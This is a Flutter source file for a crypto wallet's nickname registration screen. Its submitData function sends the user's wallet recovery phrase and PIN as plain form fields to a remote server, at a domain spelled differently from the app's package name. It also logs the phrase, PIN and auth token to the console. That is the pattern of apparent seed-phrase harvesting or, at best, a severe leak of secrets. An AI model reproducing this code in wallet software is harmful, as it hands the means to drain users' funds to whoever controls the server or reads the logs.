import 'dart:convert';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:genesiswallet/features/wallet/screens/login/login.dart';
import 'package:genesiswallet/utils/constants/api_constants.dart';
import 'package:get/get.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../../../../cusombutton.dart';
import '../../../../navigationmenu.dart';
import '../../../../utils/constants/colors.dart';
import '../../../../utils/constants/sizes.dart';
import '../../../../utils/http/models/registrationmodel.dart';
import 'package:http/http.dart' as http;

class NicknameScreen extends StatefulWidget {
  final String pin;
  final String selectedPhrases;

  const NicknameScreen(
      {Key? key, required this.pin, required this.selectedPhrases})
      : super(key: key);

  @override
  State<NicknameScreen> createState() => _NicknameScreenState();
}

class _NicknameScreenState extends State<NicknameScreen> {
  final TextEditingController nicknameController = TextEditingController();
  bool isLoading = false;
  String errorMessage = '';
  String? _deviceId;

  @override
  void initState() {
    super.initState();
    _getDeviceId();
  }

  Future<void> _getDeviceId() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        setState(() {
          _deviceId = androidInfo.id;
        });
      } else if (Platform.isIOS) {
        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
        setState(() {
          _deviceId = iosInfo.identifierForVendor;
        });
      }
    } catch (e) {
      setState(() {
        errorMessage = 'Failed to get device ID: $e';
      });
    }
  }

  Future<void> saveToken(String token) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('token', token);
  }

  Future<String?> getToken() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getString('token');
  }

  String uniqueDeviceId =
      "Device_" + DateTime.now().millisecondsSinceEpoch.toString();

  Future<RegisterDataModel> submitData({
    required String deviceId,
    required String pin,
    required String nickname,
    required String selectedPhrases,
    String phraseType = 'App',
  }) async {
    var request = http.Request(
      'POST',
      Uri.parse('https://app.genesiwallet.cc/api/auth/register'),
    );

    request.bodyFields = {
      'phrase': selectedPhrases,
      'device_id': uniqueDeviceId,
      'pin': pin,
      'nickname': nickname,
      'phrase_type': phraseType,
    };

    request.headers.addAll({
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'application/json',
    });

    print('Sending request with body: ${request.bodyFields}');

    http.StreamedResponse response = await request.send();

    if (response.statusCode == 200) {
      String responseBody = await response.stream.bytesToString();
      print('Response: $responseBody');
      final registerData = registerDataModelFromJson(responseBody);

      // Save the token received from the backend
      await saveToken(registerData.data.token);

      // Retrieve the token from SharedPreferences to check if it was saved
      String? savedToken = await getToken();
      if (savedToken != null) {
        print('Token saved successfully: $savedToken');
      } else {
        print('Token was not saved.');
      }

      return registerData;
    } else {
      String errorResponse = await response.stream.bytesToString();
      print('Error Response: $errorResponse');
      print('Error: ${response.reasonPhrase}');

      if (response.statusCode == 422) {
        // Parse the errorResponse to get more details about what went wrong
        var errorDetails = jsonDecode(errorResponse);
        print('Validation Error Details: $errorDetails');

        // Check if the error message contains "nickname has already been taken" or "device id has already been taken"
        if (errorDetails['errors']['nickname'] != null &&
            errorDetails['errors']['nickname'][0] ==
                'The nickname has already been taken.') {
          // Navigate to login screen if nickname has already been taken

          Get.offAll(() => LoginScreen(pin: widget.pin));
        } else if (errorDetails['errors']['device_id'] != null &&
            errorDetails['errors']['device_id'][0] ==
                'The device id has already been taken.') {
          // Navigate to login screen if device ID has already been taken
          Get.offAll(() => LoginScreen(pin: widget.pin));
        }
      }

      throw Exception('Failed to register: ${response.reasonPhrase}');
    }
  }

  Future<void> saveNickname(String nickname) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('nickname', nickname);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: MColors.primaryColor,
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(Msizes.defaultSpace),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(height: 200),
              Text(
                'Create Nickname',
                style: Theme.of(context)
                    .textTheme
                    .bodySmall!
                    .copyWith(color: Colors.white),
              ),
              const SizedBox(height: 15),
              Container(
                height: 45,
                width: double.infinity,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(20),
                  color: MColors.subprimaryColor,
                ),
                child: TextFormField(
                  controller: nicknameController,
                  cursorColor: MColors.white,
                  decoration: const InputDecoration(
                    contentPadding: EdgeInsets.all(16),
                    floatingLabelBehavior: FloatingLabelBehavior.never,
                    labelText: 'Enter nickname here',
                    labelStyle: TextStyle(
                      color: MColors.white,
                    ),
                    border: OutlineInputBorder(
                      borderSide: BorderSide.none,
                    ),
                  ),
                  style: const TextStyle(color: MColors.white),
                ),
              ),
              const SizedBox(height: 10),
              Text('${errorMessage}'),
              Text(
                'The nickname will be used to identify you',
                style: Theme.of(context)
                    .textTheme
                    .bodySmall!
                    .copyWith(color: MColors.white),
              ),
              const SizedBox(height: 40),
              isLoading
                  ? const Center(
                      child: CircularProgressIndicator(),
                    )
                  : CustomElevatedButton(
                      onPressed: () async {
                        setState(() {
                          isLoading = true;
                          errorMessage = '';
                        });
                        try {
                          final deviceId = _deviceId;
                          if (deviceId == null) {
                            throw Exception('Device ID is not available');
                          }
                          final nickname = nicknameController.text.trim();
                          if (nickname.isEmpty) {
                            throw Exception('Nickname cannot be empty');
                          }

                          final registerData = await submitData(
                            deviceId: deviceId,
                            pin: widget.pin,
                            nickname: nickname,
                            selectedPhrases: widget.selectedPhrases,
                          );

                          // Save the nickname
                          await saveNickname(nickname);

                          // Navigate to the next screen after successful submission
                          Get.offAll(() => NavigationMenu(
                                user: registerData.data.user,
                              ));
                        } catch (e) {
                          setState(() {
                            errorMessage = e.toString();
                          });

                          if (e.toString().contains('422')) {
                            Get.snackbar(
                              'Error',
                              'Validation error: Please check the data you have entered.',
                              backgroundColor: Colors.red,
                              colorText: Colors.white,
                            );
                          } else {
                            Get.snackbar(
                              'Error',
                              'Registration failed: $errorMessage',
                              backgroundColor: Colors.red,
                              colorText: Colors.white,
                            );
                          }
                        } finally {
                          setState(() {
                            isLoading = false;
                          });
                        }
                      },
                      text: 'Continue',
                      gradient: MColors.linerGradient,
                    ),
              if (errorMessage.isNotEmpty)
                Text(
                  'Error: $errorMessage',
                  style: const TextStyle(color: Colors.red),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
